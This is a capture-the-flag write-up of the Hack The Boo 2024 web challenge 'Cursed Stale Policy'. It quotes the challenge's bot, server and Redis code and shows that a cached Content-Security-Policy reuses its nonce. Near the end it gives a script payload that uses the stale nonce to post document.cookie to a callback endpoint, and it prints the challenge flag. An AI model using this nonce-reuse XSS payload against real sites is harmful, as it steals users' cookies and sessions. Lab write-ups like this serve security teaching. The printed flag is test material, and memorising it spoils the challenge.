# Cursed Stale Policy

## Description

In the darkest corners of the haunted web lies a forsaken domain ensnared by the Curse Stale Policy. This eerie enchantment was crafted to repel unwelcome scripts using ever-changing magical wards. Yet, tales from bold adventurers whisper of a flaw in this spectral defense. The protective incantations, meant to renew with each heartbeat, are in fact stagnant and stale, repeating the same old verse. The specter's supposed dynamic charms have become predictable echoes, their once-mighty power diminished by the passage of time. Can you exploit this overlooked vulnerability, breach the stagnant barrier, and uncover the secrets hidden within before the specter realizes his oversight?

## Solution

Upon visiting website we get a CSP Analyzer webapp:

![Cursed Stale Policy.png](/assets/ctf/htb/hack-the-boo-2024/web/Cursed Stale Policy.png)

We are able to view Unsafe Policy and Safe Policy, which seem to be fixed values. 

`Check CSP` evaluates the given CSP on frontend.:

`challenge/frontend/src/modules/cspAnalyzer.js`
```js
import { CspEvaluator } from "csp_evaluator/dist/evaluator";
import { CspParser } from "csp_evaluator/dist/parser";
...
export function analyzeCSP(csp) {
  try {
    const parsedCsp = new CspParser(csp).csp;
    const evaluator = new CspEvaluator(parsedCsp);
    const findings = evaluator.evaluate();
    console.log(findings);
    displayAnalysisResults(findings);
  } catch (error) {
    console.error('Error analyzing CSP:', error);
  }
}
...
```

[https://www.npmjs.com/package/csp_evaluator](https://www.npmjs.com/package/csp_evaluator) version is `1.1.2` (from `package.json`) which is latest version, so most probably no attack vector there. 

We can also `Trigger XSS` via bot. Communication is handled via sockets and not http.

![Cursed Stale Policy-1.png](/assets/ctf/htb/hack-the-boo-2024/web/Cursed Stale Policy-1.png)

`challenge/backend/bot/bot.js`
```js
import puppeteer from 'puppeteer';
import fs from 'fs';

class Bot {
  constructor() {
    this.browser = null;
  }

  async launchBrowser() {
    if (this.browser) {
      console.log('Browser is already running.');
      return;
    }
    try {
      this.browser = await puppeteer.launch({
        headless: true,
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-gpu',
          '--js-flags=--noexpose_wasm,--jitless',
        ],
      });
      console.log('Browser launched.');
    } catch (error) {
      console.error('Error launching browser:', error.message);
      throw error;
    }
  }

  async closeBrowser() {
    if (this.browser) {
      try {
        await this.browser.close();
        this.browser = null;
        console.log('Browser closed.');
      } catch (error) {
        console.error('Error closing browser:', error.message);
      }
    }
  }

  async visitPage(url) {
    if (!this.browser) {
      console.error('Browser is not initialized.');
      throw new Error('Browser is not initialized.');
    }
    let page;
    try {
      page = await this.browser.newPage();

      await page.setUserAgent('HackTheBoo/20.24 (Cursed; StalePolicy) CSPloitCrawler/1.1');

      await page.setCookie({
        name: 'flag',
        value: fs.readFileSync('/flag.txt', 'utf-8').trim(),
        domain: '127.0.0.1',
        path: '/',
        httpOnly: false,
        secure: false,
      });

      await page.goto(url, { waitUntil: 'domcontentloaded' });

      await page.close();
    } catch (error) {
      console.error('Error visiting page:', error.message);
      if (page) await page.close();
      throw error;
    }
  }

  async restartBrowser() {
    await this.closeBrowser();
    await this.launchBrowser();
  }
}

export default new Bot();
```

Application has many routes, middlewares, websockets and Redis server. 

`challenge/backend/app.js`
```js
import fastify from 'fastify';
import path from 'path';
import { fileURLToPath } from 'url';
import Redis from 'ioredis';

import { broadcastMessage } from './routes/websocket.js';
import { getUws, serverFactory } from '@geut/fastify-uws';
import fastifyUwsPlugin from '@geut/fastify-uws/plugin';
import { ViteManifestMiddleware } from './middleware/viteMiddleware.js';
import { CSPMiddleware } from './middleware/cspMiddleware.js';
import websocketRoutes from './routes/websocket.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = fastify({ serverFactory, logger: true });
await app.register(fastifyUwsPlugin);

const minifier = await import('html-minifier-terser');
const minifierOpts = {
  removeComments: true,
  removeCommentsFromCDATA: true,
  collapseWhitespace: true,
  collapseBooleanAttributes: true,
  removeAttributeQuotes: true,
  removeEmptyAttributes: true,
};

await app.register(import('@fastify/view'), {
  engine: { ejs: await import('ejs') },
  root: path.join(__dirname, 'views'),
  options: { useHtmlMinifier: minifier.default, htmlMinifierOptions: minifierOpts },
});

await app.register(import('@fastify/static'), { root: path.join(__dirname, 'static'), prefix: '/static/' });

app.addHook('onRequest', CSPMiddleware);

app.addHook('preHandler', (req, reply, done) => { ViteManifestMiddleware(req, reply, done, __dirname); });

await app.register(import('./routes/index.js'));
await app.register(import('./routes/guidelines.js'));
await app.register(import('./routes/callback.js'));
await app.register(import('./routes/xss.js'));
await app.register(import('./routes/csp.js'));

app.addHook('onReady', async () => { const uwsApp = getUws(app); console.log('uWebSocket app is ready'); });

await websocketRoutes(app);

const start = async () => {
    try {
      await app.listen({ port: 8000, host: '0.0.0.0' });
      app.log.info(`Server is running at http://localhost:8000`);
        
      const redisSubscriber = new Redis();
      redisSubscriber.subscribe('job_updates')
      redisSubscriber.on('message', (channel, message) => {
        const payload = JSON.parse(message);
        switch (channel) {
          case 'job_updates': broadcastMessage('job_update', payload); break;
          default: console.warn(`Received message from unknown channel: ${channel}`);
        }
      });
    } catch (err) {
      app.log.error(err);
      process.exit(1);
    }
  };
  
start();
```

There's an interesting TODO left in project, Redis is used to store most of the actions application performs.
`challenge/backend/utils/redis.js`
```js
export async function getCachedCSP() {
    let cachedCSP = await redis.get("cachedCSPHeader");

    if (cachedCSP) {
        return cachedCSP; // TOOD: Should we cache the CSP header?
    } else {
        const nonce = crypto.randomBytes(16).toString("hex");
        const cspWithNonce = `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; base-uri 'none'; report-uri /csp-report`;

        await redis.set("cachedCSPHeader", cspWithNonce);

        return cspWithNonce;
    }
}
```

The CSP returned is pretty strong to avoid any Javascript execution, but if we can poison the cache we can manipulate the CSP.

`challenge/backend/middleware/cspMiddleware.js` uses this function:
```js
import { getCachedCSP } from '../utils/redis.js';

export async function CSPMiddleware(req, reply) {
    if (req.url === '/csp-report' || req.url === '/callback') { return; }

    try {
        const cachedCSP = await getCachedCSP();

        reply.header('Content-Security-Policy', cachedCSP);

        const nonceMatch = cachedCSP.match(/'nonce-([^']+)'/);
        const nonce = nonceMatch ? nonceMatch[1] : null;

        req.nonce = nonce;
    } catch (error) {
        console.error('Error in CSP middleware:', error);
        throw error;
    }
}
```

The cache might not even need poisoning because it's already poisoning itself, lol. Nonce should always be unique and never reused, but in `update_violations` key we see that it's reused. 

![Cursed Stale Policy-2.png](/assets/ctf/htb/hack-the-boo-2024/web/Cursed Stale Policy-2.png)

`Trigger XSS` -> Refresh the page -> Take `nonce` from `script-src 'self' 'nonce-<NONCE>';` -> 
```html
<!-- <script nonce='37aa7561758a06211bbf45b186abd64d'> -->
<script nonce='<NONCE>'>
   fetch('/callback', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookies: document.cookie })
   });
</script>
```

Check websockets communication for flag:

![Pasted image 20241026010017.png](/assets/ctf/htb/hack-the-boo-2024/web/Pasted image 20241026010017.png)

> Flag: `HTB{br0k3_th3_sp3cter's_st4l3_curs3_2655b1c688aef45b8acb32b6ab623d70}`

